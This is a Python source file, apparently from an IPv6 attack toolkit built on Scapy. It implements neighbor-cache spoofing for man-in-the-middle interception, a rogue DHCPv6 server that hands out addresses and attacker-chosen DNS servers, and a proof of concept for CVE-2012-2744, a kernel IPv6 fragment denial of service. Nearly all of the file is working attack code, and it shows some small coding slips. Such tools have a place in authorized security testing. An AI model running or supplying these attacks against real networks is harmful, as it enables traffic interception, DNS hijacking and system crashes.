#!/usr/bin/python
# Filename: attacks.py
import random
#import create_layers
import scapy.all
#from scapy.all import * 
#from fileio import *
import ipaddr
import netaddr
#from checkip import *
#from netaddr import *
#from create_layers import *
import address_generators
import create_extension_headers_chain
import create_layer4
version = '0.9'

###################################################################
####################FOR MITM ATTACK################################
###################################################################
def find_mac_using_spoofed_source(source, destination_list, interface, mac_source):
	addresses={}
	for dest in destination_list:
		for spoofer in destination_list:
			if not spoofer==dest:
				print "Spoofing Neighbor Solicitation from ",spoofer,"to",dest,"using MAC address",mac_source
				new_address = neighbor_solicitation_spoofing(spoofer, dest, interface, mac_source)
				addresses.update(new_address)
	return addresses

def neighbor_solicitation_spoofing(spoofed_source, target, myinterface, mac):
	solicited_node_multicast_address_prefix="ff02::1:ff"
	addr6 = ipaddr.IPv6Address(target)
	exploded=addr6.exploded
	length=len(exploded)
	suffix=exploded[(length-2):length]
	other=exploded[(length-4):(length-2)]
	the_other=exploded[(length-7):(length-5)]
	addresses={}
	#ns=ICMPv6ND_NS(tgt=target, R=0, S=0, O=1)/ICMPv6NDOptDstLLAddr(type=1,lladdr=mac)
	ns=scapy.layers.inet6.ICMPv6ND_NS(tgt=target)/scapy.layers.inet6.ICMPv6NDOptDstLLAddr(type=1,lladdr=mac)
	multi_address=solicited_node_multicast_address_prefix+the_other+":"+other+suffix
	packet=scapy.layers.inet6.IPv6(src=spoofed_source,dst=multi_address)/ns
	dest_multi_mac="33:33:ff:"+the_other+":"+other+":"+suffix
	ans,unan=scapy.sendrecv.srp(scapy.layers.l2.Ether(src=mac, dst=dest_multi_mac)/packet,iface=myinterface, timeout=2)
	for s,r in ans:
		try:
			addresses.update({r[IPv6].src:r[scapy.layers.l2.Ether].src})
		except:
			print "target",target, "was not found"
	return addresses

def unsoliceted_neighbor_advertisement_spoofing(victim, myinterface, mac_source):
	targets=victim.keys()
	spoof_neighbor_advertisement(victim, myinterface, mac_source)

def spoof_neighbor_advertisement(target, myinterface, mac_source):
	targets=target.keys()
	for dest in targets:
		for spoofed_target in targets:
			if not (spoofed_target == dest):
				na=scapy.layers.inet6.ICMPv6ND_NA(tgt=spoofed_target, R=0, S=0, O=1)/scapy.layers.inet6.ICMPv6NDOptDstLLAddr(type=2,lladdr=mac_source)
				packet=scapy.layers.inet6.IPv6(src=spoofed_target,dst=dest)/na
				scapy.sendrecv.sendp(scapy.layers.l2.Ether(dst=target[dest])/packet,iface=myinterface)
				print "spoofed packet sent to", dest, "as", spoofed_target, "using MAC address", mac_source

def soliceted_neighbor_advertisement_spoofing(packets,mac_source, myinterface):
	if packets[scapy.layers.inet6.IPv6].dst[0:7] == "ff02::1":
		mytarget=packets.payload.payload.tgt
		myvictim_ip=packets.payload.src
		myvictim_ether=packets.src
		na=scapy.layers.inet6.ICMPv6ND_NA(tgt=mytarget, R=0, S=1, O=1)/scapy.layers.inet6.ICMPv6NDOptDstLLAddr(lladdr=mac_source)
		packet=scapy.layers.inet6.IPv6(src=mytarget,dst=myvictim_ip)/na
		scapy.sendrecv.sendp(scapy.layers.l2.Ether(dst=myvictim_ether)/packet,iface=myinterface)
		print "spoofed packet sent to MAC", myvictim_ether, "IP",  myvictim_ip, "as", mytarget, "using MAC address", mac_source
		na=scapy.layers.inet6.ICMPv6ND_NA(tgt=mytarget, R=0, S=0, O=1)/scapy.layers.inet6.ICMPv6NDOptDstLLAddr(lladdr=mac_source)
		packet=scapy.layers.inet6.IPv6(src=mytarget,dst=myvictim_ip)/na
		scapy.sendrecv.sendp(scapy.layers.l2.Ether(dst=myvictim_ether)/packet,iface=myinterface)
		print "spoofed packet sent to MAC", myvictim_ether, "IP",  myvictim_ip, "as", mytarget, "using MAC address", mac_source
		#spoof_neighbor_advertisement()
	else:
		mytarget=packets[scapy.layers.inet6.IPv6].dst
		#na=scapy.layers.inet6.ICMPv6ND_NA(tgt=mytarget, R=0, S=1, O=1)/scapy.layers.inet6.ICMPv6NDOptDstLLAddr(lladdr=mac_source)
		na=scapy.layers.inet6.ICMPv6ND_NA(tgt=mytarget, R=0, S=1, O=1)
		packet=scapy.layers.inet6.IPv6(src=mytarget,dst=packets.payload.src)/na
		scapy.sendrecv.sendp(scapy.layers.l2.Ether(dst=packets.src)/packet,iface=myinterface)
		print "spoofed packet sent to MAC", packets.src, "IP ",  packets.payload.src, "as", mytarget, "using MAC address", mac_source
		scapy.sendrecv.sendp(scapy.layers.l2.Ether(dst=packets.src)/packet,iface=myinterface)


###################################################################
###################### FOR DHCPV6  ################################
###################################################################

def DHCPv6_Response(mac_source, source_ip, macdst, ipv6dst, Trid, ClientID_len, ClientID_duid, IaId, type_of_message, assigned_IPv6_addresses_cache, myinterface, dhcpv6_preference, prefered_lft,valid_lft,DNS_Domain_name,DNS_Servers, list_of_unfragmented_ext_headers,list_of_fragmented_ext_headers,size_of_extheaders, number_of_fragments,list_of_next_headers,list_of_offsets,list_of_fragment_lengths,list_of_fragment_m_bits,myprefix,unfragmentable_part,size_of_unfragmentable_part,first_next_header_value,fragmentable_extension_headers,size_of_fragmentable_extension_headers,s):
	iana = scapy.layers.dhcp6.DHCP6OptIA_NA()
	iana.iaid=IaId
	iana.T1 = 0
	iana.T2 = 0
	iana.optlen=12 + 28 #12 for the DHCP6OptIA_NA and 28 for one DHCP6OptIAAddress 
	ia_address = scapy.layers.dhcp6.DHCP6OptIAAddress()
	ia_address.preflft = prefered_lft 
	ia_address.validlft = valid_lft
	ClientID=scapy.layers.dhcp6.DHCP6OptClientId(optlen=ClientID_len, duid=ClientID_duid)
	ServerID=scapy.layers.dhcp6.DHCP6OptServerId()
	ServerID.duid = ("00030001"+ str(netaddr.EUI(mac_source)).replace("-","")).decode("hex")
	DNSDomains=scapy.layers.dhcp6.DHCP6OptDNSDomains()
	DNSDomains.dnsdomains=[DNS_Domain_name]
	DNSServers=scapy.layers.dhcp6.DHCP6OptDNSServers()
	DNSServers.dnsservers=[DNS_Servers]

	provided_IPv6_address=assigned_IPv6_addresses_cache.get(macdst)
	if not provided_IPv6_address:
		provided_IPv6_address=address_generators.generate_random_ipv6(myprefix)
		assigned_IPv6_addresses_cache[macdst]=provided_IPv6_address
	ia_address.addr= provided_IPv6_address

	if type_of_message=="Advertise":
		message_type = scapy.layers.dhcp6.DHCP6_Advertise(trid=Trid)
		print "DHCPv6 Advertise packet sent with Transaction ID", Trid,"to",macdst,"with IPv6 Address",provided_IPv6_address
	elif type_of_message=="Reply":
		message_type = scapy.layers.dhcp6.DHCP6_Reply(trid=Trid)
		print "DHCPv6 Reply packet sent with Transaction ID", Trid,"to",macdst,"with IPv6 Address",provided_IPv6_address
	dhcpv6pkt = message_type/iana/ia_address/ClientID/scapy.layers.dhcp6.DHCP6OptPref(prefval= dhcpv6_preference)/ServerID/DNSServers/DNSDomains
	packets=create_extension_headers_chain.create_datagram(mac_source,macdst,int(number_of_fragments),list_of_next_headers,list_of_offsets,list_of_fragment_lengths,list_of_fragment_m_bits,-1,unfragmentable_part,size_of_unfragmentable_part,first_next_header_value,fragmentable_extension_headers,size_of_fragmentable_extension_headers,create_layer4.udp_packet_id(546,dhcpv6pkt,547))
	create_extension_headers_chain.send_packets(s,packets,0)

###################################################################
###################### CVE 2012-2744###############################
###################################################################
def CVE_2012_2744(interface,mac_source,sip,dip,layer2_addr):
	myid=random.randrange(1,4294967296,1)  #generate a random fragmentation id 
	payload1=scapy.packet.Raw("AABBCCDD") 
	icmpv6=scapy.layers.inet6.ICMPv6EchoRequest(data=payload1) 
	ipv6_1=scapy.layers.inet6.IPv6(src=sip, dst=dip, plen=24) 
	ipv6_2=scapy.layers.inet6.IPv6(src=sip, dst=dip, plen=16) 
	csum=scapy.layers.inet6.in6_chksum(58, ipv6_1/icmpv6, str(icmpv6))
	icmpv6=scapy.layers.inet6.ICMPv6EchoRequest(cksum=csum, data=payload1)
	frag1=scapy.layers.inet6.IPv6ExtHdrFragment(offset=0, m=1, id=myid)
	frag2=scapy.layers.inet6.IPv6ExtHdrFragment(offset=1, m=0, id=myid)
	packet1=ipv6_1/frag1/icmpv6
	packet2=ipv6_2/frag2/payload1
	layer2=scapy.layers.l2.Ether(src=mac_source,dst=layer2_addr)
        scapy.sendrecv.sendp(layer2/packet2,iface=interface)
        scapy.sendrecv.sendp(layer2/packet1,iface=interface)
	##References##
	##http://www.securiteam.com/cves/2012/CVE-2012-2744.html
	##http://www.securityfocus.com/bid/54367/exploit 

version = '0.9'
# End of  attacks.py
